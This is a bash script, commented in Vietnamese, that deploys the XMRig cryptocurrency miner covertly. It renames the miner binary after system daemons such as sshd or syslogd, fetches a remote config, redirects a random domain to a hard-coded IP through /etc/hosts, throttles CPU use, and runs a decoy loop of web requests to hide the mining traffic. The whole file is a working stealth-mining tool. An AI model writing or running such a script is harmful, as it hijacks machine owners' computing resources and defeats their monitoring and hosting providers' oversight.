#!/bin/bash

# Cài đặt cpulimit
sudo apt install cpulimit -y
if ! command -v cpulimit &> /dev/null; then
  echo "Lỗi: Không thể cài đặt cpulimit."
  exit 1
fi

# Tạo thư mục app và tải xuống xmrig
mkdir app
wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-focal-x64.tar.gz
tar -xvf xmrig-6.22.2-focal-x64.tar.gz
rm xmrig-6.22.2-focal-x64.tar.gz

# Tạo tên ngẫu nhiên và di chuyển tệp thực thi
RAND_NAME=$(shuf -n1 -e syslogd sshd cron systemd update-daemon)
mv xmrig-6.22.2/xmrig "app/$RAND_NAME"
echo "$RAND_NAME" > app/.exec_name
rm -rf xmrig-6.22.2
chmod +x app/*

# Tải xuống config.json
cd app
wget https://raw.githubusercontent.com/n2lentertainement/vebo/refs/heads/main/config.json
if [[ ! -f "config.json" ]]; then
  echo "Lỗi: Không thể tải xuống config.json."
  exit 1
fi

# Tạo domain ngẫu nhiên
ADJECTIVES=("fast" "bright" "cool" "smart" "strong" "happy" "lucky" "brave" "quick" "clever" "dynamic" "bold" "energetic" "fiery" "fearless" "mighty" "swift" "agile" "sharp" "resilient" "powerful" "legendary" "epic" "unstoppable" "invincible")
NOUNS=("cloud" "server" "tech" "data" "proxy" "network" "system" "engine" "portal" "hub" "node" "shield" "core" "matrix" "stream" "cipher" "signal" "firewall" "galaxy" "infinity" "quantum" "cosmos" "relay" "gateway" "nexus" "voyager" "beacon" "titan" "fortress")

RANDOM_ADJ=${ADJECTIVES[$RANDOM % ${#ADJECTIVES[@]}]}
RANDOM_NOUN=${NOUNS[$RANDOM % ${#NOUNS[@]}]}
RANDOM_SUFFIX=$(openssl rand -hex 2)

RANDOM_DOMAIN="${RANDOM_ADJ}-${RANDOM_NOUN}-${RANDOM_SUFFIX}.com"

# IP cần trỏ đến
TARGET_IP="195.201.221.153"

# Thêm bản ghi DNS vào file /etc/hosts
echo "$TARGET_IP $RANDOM_DOMAIN" | sudo tee -a /etc/hosts > /dev/null

# Thay thế domain trong file config
sed -i "s/hissecretobsession-coupon.com/$RANDOM_DOMAIN/g" config.json
echo "Đã trỏ domain $RANDOM_DOMAIN về IP $TARGET_IP và cập nhật file config."

# Tạo script fake_traffic.sh
cat <<EOF > fake_traffic.sh
#!/bin/bash
WEBSITES=("https://www.youtube.com" "https://www.google.com" "https://www.facebook.com" "https://www.amazon.com" "https://www.wikipedia.org" "https://www.reddit.com" "https://www.instagram.com" "https://www.linkedin.com" "https://www.twitter.com" "https://www.netflix.com")

while true; do
    # Chọn ngẫu nhiên một trang web từ mảng
    RANDOM_WEBSITE=\${WEBSITES[\$RANDOM % \${#WEBSITES[@]}]}
    
    # Truy cập trang web và bỏ qua đầu ra
    curl -s "\$RANDOM_WEBSITE" > /dev/null
    
    # Ngủ trong khoảng thời gian ngẫu nhiên từ 10 đến 20 giây
    sleep \$((RANDOM % 11 + 10))
done
EOF
chmod +x fake_traffic.sh

cat <<EOF > start.sh
#!/bin/bash
export PATH=".:\$PATH"  # Thêm thư mục hiện tại vào PATH

# Khởi chạy $RAND_NAME và giới hạn CPU
$RAND_NAME --donate-level 1 --cpu-priority 3 --randomx-1gb-pages &
exec_pid=\$!
cpulimit -p \$exec_pid -l 60 &

# Lặp lại việc chạy fake_traffic.sh mỗi 5 phút
while true; do
    # Kill tiến trình fake_traffic.sh cũ nếu có
    if [[ -n "\$fake_traffic_pid" ]]; then
        kill \$fake_traffic_pid 2>/dev/null
    fi

    # Khởi chạy fake_traffic.sh mới
    ./fake_traffic.sh &
    fake_traffic_pid=\$!

    # Chờ 5 phút trước khi lặp lại
    sleep 300
done
EOF
chmod +x start.sh

# Chạy start.sh trong background
./start.sh &
